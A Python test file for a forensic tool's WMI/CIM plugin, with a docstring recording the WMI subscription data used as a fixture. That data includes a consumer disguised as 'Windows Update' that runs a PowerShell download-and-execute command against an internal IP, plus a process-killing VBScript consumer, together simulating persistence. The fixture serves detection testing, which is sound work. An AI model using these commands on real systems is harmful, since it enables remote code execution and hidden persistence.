from __future__ import annotations

from typing import TYPE_CHECKING

from dissect.target.plugins.os.windows import cim
from dissect.target.plugins.os.windows.cim import ActiveScriptEventConsumerRecord, CommandLineEventConsumerRecord
from tests._utils import absolute_path

if TYPE_CHECKING:
    from dissect.target.filesystem import VirtualFilesystem
    from dissect.target.target import Target


def test_cim_plugin(target_win: Target, fs_win: VirtualFilesystem) -> None:
    wbem_repository = absolute_path("_data/plugins/os/windows/cim")
    fs_win.map_dir("Windows/System32/wbem/repository", wbem_repository)

    target_win.add_plugin(cim.CimPlugin)
    consumer_records = list(target_win.cim.consumerbindings())
    assert len(consumer_records) == 3
    assert len([r for r in consumer_records if type(r) == CommandLineEventConsumerRecord.recordType]) == 1  # noqa: E721
    assert len([r for r in consumer_records if type(r) == ActiveScriptEventConsumerRecord.recordType]) == 2  # noqa: E721
    # Ensure associated filter query was correctly found for all
    assert len([record for record in target_win.cim() if record.filter_query]) == 3


r"""
Result of the WMI query on the system used to generate the test data

## __FilterToConsumerBinding
```
 Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
__GENUS                 : 2
__CLASS                 : __FilterToConsumerBinding
__SUPERCLASS            : __IndicationRelated
__DYNASTY               : __SystemClass
__RELPATH               : __FilterToConsumerBinding.Consumer="\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\"Windows Update Consumer MOF\"",Filter="\\\\.\\root\\subscription:__EventFilter.Name=\"Windows Update Event MOF\""
__PROPERTY_COUNT        : 7
__DERIVATION            : {__IndicationRelated, __SystemClass}
__SERVER                : DESKTOP-O8964S4
__NAMESPACE             : ROOT\Subscription
__PATH                  : \\DESKTOP-O8964S4\ROOT\Subscription:__FilterToConsumerBinding.Consumer="\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\"Windows Update Consumer MOF\"",Filter="\\\\.\\root\\subscription:__EventFilter.Name=\"Windows Update Event MOF\""
Consumer                : \\.\root\subscription:CommandLineEventConsumer.Name="Windows Update Consumer MOF"
CreatorSID              : {1, 5, 0, 0...}
DeliverSynchronously    : False
DeliveryQoS             :
Filter                  : \\.\root\subscription:__EventFilter.Name="Windows Update Event MOF"
MaintainSecurityContext : False
SlowDownProviders       : False
PSComputerName          : DESKTOP-O8964S4

__GENUS                 : 2
__CLASS                 : __FilterToConsumerBinding
__SUPERCLASS            : __IndicationRelated
__DYNASTY               : __SystemClass
__RELPATH               : __FilterToConsumerBinding.Consumer="NTEventLogEventConsumer.Name=\"SCM Event Log Consumer\"",Filter="__EventFilter.Name=\"SCM Event Log Filter\""
__PROPERTY_COUNT        : 7
__DERIVATION            : {__IndicationRelated, __SystemClass}
__SERVER                : DESKTOP-O8964S4
__NAMESPACE             : ROOT\Subscription
__PATH                  : \\DESKTOP-O8964S4\ROOT\Subscription:__FilterToConsumerBinding.Consumer="NTEventLogEventConsumer.Name=\"SCM Event Log Consumer\"",Filter="__EventFilter.Name=\"SCM Event Log Filter\""
Consumer                : NTEventLogEventConsumer.Name="SCM Event Log Consumer"
CreatorSID              : {1, 2, 0, 0...}
DeliverSynchronously    : False
DeliveryQoS             :
Filter                  : __EventFilter.Name="SCM Event Log Filter"
MaintainSecurityContext : False
SlowDownProviders       : False
PSComputerName          : DESKTOP-O8964S4

__GENUS                 : 2
__CLASS                 : __FilterToConsumerBinding
__SUPERCLASS            : __IndicationRelated
__DYNASTY               : __SystemClass
__RELPATH               : __FilterToConsumerBinding.Consumer="\\\\.\\root\\subscription:ActiveScriptEventConsumer.Name=\"bad vbs\"",Filter="\\\\.\\root\\subscription:__EventFilter.Name=\"Windows\\\" Update Event MOF\""
__PROPERTY_COUNT        : 7
__DERIVATION            : {__IndicationRelated, __SystemClass}
__SERVER                : DESKTOP-O8964S4
__NAMESPACE             : ROOT\Subscription
__PATH                  : \\DESKTOP-O8964S4\ROOT\Subscription:__FilterToConsumerBinding.Consumer="\\\\.\\root\\subscription:ActiveScriptEventConsumer.Name=\"bad vbs\"",Filter="\\\\.\\root\\subscription:__EventFilter.Name=\"Windows\\\" Update Event MOF\""
Consumer                : \\.\root\subscription:ActiveScriptEventConsumer.Name="bad vbs"
CreatorSID              : {1, 5, 0, 0...}
DeliverSynchronously    : False
DeliveryQoS             :
Filter                  : \\.\root\subscription:__EventFilter.Name="Windows\" Update Event MOF"
MaintainSecurityContext : False
SlowDownProviders       : False
PSComputerName          : DESKTOP-O8964S4

__GENUS                 : 2
__CLASS                 : __FilterToConsumerBinding
__SUPERCLASS            : __IndicationRelated
__DYNASTY               : __SystemClass
__RELPATH               : __FilterToConsumerBinding.Consumer="\\\\.\\root\\subscription:ActiveScriptEventConsumer.Name=\"bad vbs\"",Filter="\\\\.\\root\\subscription:__EventFilter.Name=\"Windows Update Event MOF\""
__PROPERTY_COUNT        : 7
__DERIVATION            : {__IndicationRelated, __SystemClass}
__SERVER                : DESKTOP-O8964S4
__NAMESPACE             : ROOT\Subscription
__PATH                  : \\DESKTOP-O8964S4\ROOT\Subscription:__FilterToConsumerBinding.Consumer="\\\\.\\root\\subscription:ActiveScriptEventConsumer.Name=\"bad vbs\"",Filter="\\\\.\\root\\subscription:__EventFilter.Name=\"Windows Update Event MOF\""
Consumer                : \\.\root\subscription:ActiveScriptEventConsumer.Name="bad vbs"
CreatorSID              : {1, 5, 0, 0...}
DeliverSynchronously    : False
DeliveryQoS             :
Filter                  : \\.\root\subscription:__EventFilter.Name="Windows Update Event MOF"
MaintainSecurityContext : False
SlowDownProviders       : False
PSComputerName          : DESKTOP-O8964S4
```

## __EventFilter

```
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
__GENUS          : 2
__CLASS          : __EventFilter
__SUPERCLASS     : __IndicationRelated
__DYNASTY        : __SystemClass
__RELPATH        : __EventFilter.Name="Windows Update Event MOF"
__PROPERTY_COUNT : 6
__DERIVATION     : {__IndicationRelated, __SystemClass}
__SERVER         : DESKTOP-O8964S4
__NAMESPACE      : ROOT\Subscription
__PATH           : \\DESKTOP-O8964S4\ROOT\Subscription:__EventFilter.Name="Windows Update Event MOF"
CreatorSID       : {1, 5, 0, 0...}
EventAccess      :
EventNamespace   : root\cimv2
Name             : Windows Update Event MOF
Query            : SELECT * FROM __InstanceCreationEvent WITHIN 5WHERE TargetInstance ISA "Win32_Process" AND TargetInstance.Name = "test.exe"
QueryLanguage    : WQL
PSComputerName   : DESKTOP-O8964S4

__GENUS          : 2
__CLASS          : __EventFilter
__SUPERCLASS     : __IndicationRelated
__DYNASTY        : __SystemClass
__RELPATH        : __EventFilter.Name="SCM Event Log Filter"
__PROPERTY_COUNT : 6
__DERIVATION     : {__IndicationRelated, __SystemClass}
__SERVER         : DESKTOP-O8964S4
__NAMESPACE      : ROOT\Subscription
__PATH           : \\DESKTOP-O8964S4\ROOT\Subscription:__EventFilter.Name="SCM Event Log Filter"
CreatorSID       : {1, 2, 0, 0...}
EventAccess      :
EventNamespace   : root\cimv2
Name             : SCM Event Log Filter
Query            : select * from MSFT_SCMEventLogEvent
QueryLanguage    : WQL
PSComputerName   : DESKTOP-O8964S4

__GENUS          : 2
__CLASS          : __EventFilter
__SUPERCLASS     : __IndicationRelated
__DYNASTY        : __SystemClass
__RELPATH        : __EventFilter.Name="Windows\" Update Event MOF"
__PROPERTY_COUNT : 6
__DERIVATION     : {__IndicationRelated, __SystemClass}
__SERVER         : DESKTOP-O8964S4
__NAMESPACE      : ROOT\Subscription
__PATH           : \\DESKTOP-O8964S4\ROOT\Subscription:__EventFilter.Name="Windows\" Update Event MOF"
CreatorSID       : {1, 5, 0, 0...}
EventAccess      :
EventNamespace   : root\cimv2
Name             : Windows" Update Event MOF
Query            : SELECT * FROM __InstanceCreationEvent WITHIN 5WHERE TargetInstance ISA "Win32_Process" AND TargetInstance.Name = "test.exe"
QueryLanguage    : WQL
PSComputerName   : DESKTOP-O8964S4
```

## EventConsumer
```
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
__GENUS          : 2
__CLASS          : ActiveScriptEventConsumer
__SUPERCLASS     : __EventConsumer
__DYNASTY        : __SystemClass
__RELPATH        : ActiveScriptEventConsumer.Name="bad vbs"
__PROPERTY_COUNT : 8
__DERIVATION     : {__EventConsumer, __IndicationRelated, __SystemClass}
__SERVER         : DESKTOP-O8964S4
__NAMESPACE      : ROOT\Subscription
__PATH           : \\DESKTOP-O8964S4\ROOT\Subscription:ActiveScriptEventConsumer.Name="bad vbs"
CreatorSID       : {1, 5, 0, 0...}
KillTimeout      : 0
MachineName      :
MaximumQueueSize :
Name             : bad vbs
ScriptFilename   :
ScriptingEngine  : VBScript
ScriptText       : Dim oLocation, oServices, oProcessList, oProcess

                                    Set oLocation = CreateObject("WbemScripting.SWbemLocator")
                        Set oServices = oLocation.ConnectServer(, "root\cimv2")
                        Set oProcessList = oServices.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessID = " & TargetEvent.ProcessID)
                        For Each oProcess in oProcessList
                                oProcess.Terminate()
                        Next
PSComputerName   : DESKTOP-O8964S4

__GENUS               : 2
__CLASS               : CommandLineEventConsumer
__SUPERCLASS          : __EventConsumer
__DYNASTY             : __SystemClass
__RELPATH             : CommandLineEventConsumer.Name="Windows Update Consumer MOF"
__PROPERTY_COUNT      : 27
__DERIVATION          : {__EventConsumer, __IndicationRelated, __SystemClass}
__SERVER              : DESKTOP-O8964S4
__NAMESPACE           : ROOT\Subscription
__PATH                : \\DESKTOP-O8964S4\ROOT\Subscription:CommandLineEventConsumer.Name="Windows Update Consumer MOF"
CommandLineTemplate   : cmd /C powershell.exe -nop iex(New-Object Net.WebClient).DownloadString('http://10.0.0.104/bad.exe'); bad.exe
CreateNewConsole      : False
CreateNewProcessGroup : False
CreateSeparateWowVdm  : False
CreateSharedWowVdm    : False
CreatorSID            : {1, 5, 0, 0...}
DesktopName           :
ExecutablePath        :
FillAttribute         :
ForceOffFeedback      : False
ForceOnFeedback       : False
KillTimeout           : 0
MachineName           :
MaximumQueueSize      :
Name                  : Windows Update Consumer MOF
Priority              : 32
RunInteractively      : False
ShowWindowCommand     :
UseDefaultErrorMode   : False
WindowTitle           :
WorkingDirectory      :
XCoordinate           :
XNumCharacters        :
XSize                 :
YCoordinate           :
YNumCharacters        :
YSize                 :
PSComputerName        : DESKTOP-O8964S4

__GENUS                  : 2
__CLASS                  : NTEventLogEventConsumer
__SUPERCLASS             : __EventConsumer
__DYNASTY                : __SystemClass
__RELPATH                : NTEventLogEventConsumer.Name="SCM Event Log Consumer"
__PROPERTY_COUNT         : 13
__DERIVATION             : {__EventConsumer, __IndicationRelated, __SystemClass}
__SERVER                 : DESKTOP-O8964S4
__NAMESPACE              : ROOT\Subscription
__PATH                   : \\DESKTOP-O8964S4\ROOT\Subscription:NTEventLogEventConsumer.Name="SCM Event Log Consumer"
Category                 : 0
CreatorSID               : {1, 2, 0, 0...}
EventID                  : 0
EventType                : 1
InsertionStringTemplates : {}
MachineName              :
MaximumQueueSize         :
Name                     : SCM Event Log Consumer
NameOfRawDataProperty    :
NameOfUserSIDProperty    : sid
NumberOfInsertionStrings : 0
SourceName               : Service Control Manager
UNCServerName            :
PSComputerName           : DESKTOP-O8964S4
```
"""  # noqa: E501
